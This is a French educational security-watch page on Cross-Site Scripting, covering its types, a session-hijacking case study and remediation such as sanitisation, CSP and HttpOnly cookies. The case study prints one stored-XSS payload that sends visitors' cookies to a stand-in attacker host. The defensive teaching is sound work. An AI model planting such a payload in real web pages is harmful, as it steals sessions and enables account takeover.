Veille Cyber : Failles Cross-Site Scripting (XSS)

Analyse d'une des vulnérabilités les plus critiques du web (OWASP Top 10).

Comprendre la menace

La faille XSS consiste à injecter des scripts malveillants dans des pages web consultées par d'autres utilisateurs. Contrairement à l'injection SQL, la cible n'est pas le serveur, mais le navigateur du client.

Types de vulnérabilités

Type XSS Mécanisme Dangerosité
Stockée (Persistent) Script enregistré en BDD (ex: commentaires, profils). Critique
Réfléchie (Reflected) Script passé via une URL ou un paramètre de recherche. Élevée
DOM-based Modification dynamique de l'environnement côté client (JS). Modérée

Sources de Veille

ANSSI PortSwigger (Burp Suite) OWASP Foundation CVE Mitre

Étude de Cas : Vol de Session (Hijacking)

Vecteur d'attaque : Un champ "avis client" non filtré sur une plateforme e-commerce.

Payload injecté : <script>fetch('https://malicious.com/log?c='+document.cookie)</script>

Mécanisme : Le script est stocké en base. Chaque utilisateur consultant le produit envoie automatiquement son cookie de session vers le serveur de l'attaquant.

Impact : Usurpation de compte totale, accès aux données bancaires et personnelles.

Mesures de Remédiation

Protection Développement

  • Sanitization : Utiliser des libs comme DOMPurify.
  • Output Encoding : Convertir les caractères spéciaux en entités HTML.
  • Validation : Filtrer les entrées (Type, Longueur, Format).

Sécurité Infrastructure

  • CSP : Définir une Content Security Policy stricte.
  • Cookies : Flag HttpOnly et Secure.
  • WAF : Pare-feu applicatif pour bloquer les payloads connus.

Conclusion : Ma veille démontre qu'aucune méthode n'est infaillible seule. La stratégie "Defense in Depth" (Défense en profondeur), combinant assainissement du code et politique CSP robuste, est indispensable pour sécuriser les applications modernes.
